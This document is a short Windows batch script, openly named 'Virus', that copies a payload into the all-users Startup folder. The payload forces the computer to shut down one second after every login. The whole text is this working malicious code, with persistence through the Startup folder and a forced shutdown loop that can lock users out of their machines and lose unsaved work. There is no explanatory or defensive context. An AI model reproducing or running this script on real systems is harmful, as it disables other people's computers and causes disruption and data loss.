@echo off
set "FILENAME=Virus"
set "PLACE=C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
 
if not exist "%PLACE%" md "%PLACE%"
 
set count=1
set "postfix="
:FILE
set "FILE=%PLACE%\%FILENAME%%postfix%.bat"
if exist "%FILE%" (
    set "postfix= %count%"
    set /a count+=1
    goto FILE
)
for /f "delims=[]" %%N in ('find /n ":TEXT" ^<"%~f0"') do more +%%N >"%FILE%" <"%~f0"

exit /b
 
:TEXT
@echo off
shutdown -s -f -t 1
exit